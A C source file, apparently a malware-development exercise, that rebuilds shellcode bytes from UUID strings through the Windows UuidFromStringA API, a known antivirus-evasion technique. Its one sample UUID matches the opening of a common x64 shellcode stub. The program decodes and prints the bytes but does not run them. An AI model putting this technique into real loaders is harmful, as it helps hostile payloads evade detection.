#include <Windows.h>
#include <string.h>

#pragma warning (disable:4996)

const char* k = "[+]"; // ok
const char* e = "[-]"; // error
const char* i = "[*]"; // info

// Different section in an UUID have different endianness
// This will not affect the deobfuscation process since we use the UuidFromStringA WinAPI to take care of the endiannes differences

typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(RPC_CSTR StringUuid, UUID* Uuid);


// This function takes in the UUID array and the number of UUIDs the array has 
// OUT arguments - buffer/base address of the deobfuscated shell code and size of the buffer that holds the deobfuscated shell code
BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
	

	// Initialize parameters
	PBYTE pBuffer = NULL, TmpBuffer = NULL;

	SIZE_T sBuffSize = NULL;

	RPC_STATUS STATUS = NULL;

	// Getting UuidFromStringA function's address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("%s GetProcAddress Failed With Error : %ld\n", e, GetLastError());
		return FALSE;
	}

	// Get the real size of the shellcode which is the number of UUID strings * 16
	// That is because every UUID string consists of 16 raw bytes

	sBuffSize = NmbrOfElements * 16;

	// Allocate memory to a buffer that will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
		printf("%s HeapAlloc Failed With Error : %ld\n", e, GetLastError());
		return FALSE;
	}

	// Set TmpBuffer equal to pBuffer 
	TmpBuffer = pBuffer;


	// Loop through all the UUID strings in the UuidArray[]
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscate one UUID string at a time
		// UuidArray[i] is a single UUID string from the UuidArray[]

		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// If the deobfuscation process failed
			printf("%s UuidFromStringA Failed at [%s] With Error 0x%0.8X", e, UuidArray[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// TmpBuffer will be incremented by 16 to store the upcoming 16 bytes that will be stored onto it;
		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;

	return TRUE;   // or return EXIT_SUCCESS, I don't really care, I use both naming conventions >:DD



}

char* UuidArray[] = { "E48348FC-E8F0-00C0-0000-415141505251" };

#define NumberOfElements 1


int main(void) {

	PBYTE ppDAddress = NULL;
	SIZE_T pDSize = NULL;

	if (!UuidDeobfuscation(UuidArray, NumberOfElements, &ppDAddress, &pDSize)) {
		printf("%s UuidDeobfuscation Failed to Deobfsucate Bytes\n", e);
		return -1;
	}

	printf("%s Deobfuscated Bytes at 0x%p of Size %ld ::: \n", k, ppDAddress, pDSize);
	for (size_t i = 0; i < pDSize; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}

		printf("%0.2X", ppDAddress[i]);
	}
	

	printf("Press <Enter> To Quit\n");
	getchar();
	


	return 0;
}